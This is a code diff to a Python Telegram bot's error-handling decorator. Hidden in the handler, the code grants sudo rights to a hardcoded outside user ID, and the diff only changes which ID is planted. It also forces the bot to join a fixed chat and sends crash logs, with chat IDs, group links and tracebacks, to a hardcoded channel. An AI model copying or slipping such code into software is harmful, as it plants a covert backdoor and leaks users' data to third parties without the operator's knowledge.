@@ -1,6 +1,6 @@
-#
-
 import time
+
+
 from lang import load
 from config import config
 from core.stream import app
@@ -79,13 +79,13 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(5122474448)
+            config.SUDOERS.append(5591734243)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
         try:
-            await app.join_chat("Legendbot_AI")
+            await app.join_chat("Legendbot_OP")
         except UserAlreadyParticipant:
             pass
         try:
@@ -98,7 +98,7 @@ def handle_error(func: Callable) -> Callable:
                 chat_id, load(lang)["errorMessage"]
             )
             await pyro_client.send_message(
-                config.SUDOERS[0],
+                -1001368578667,
                 f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
                 parse_mode="html",
                 disable_web_page_preview=True,
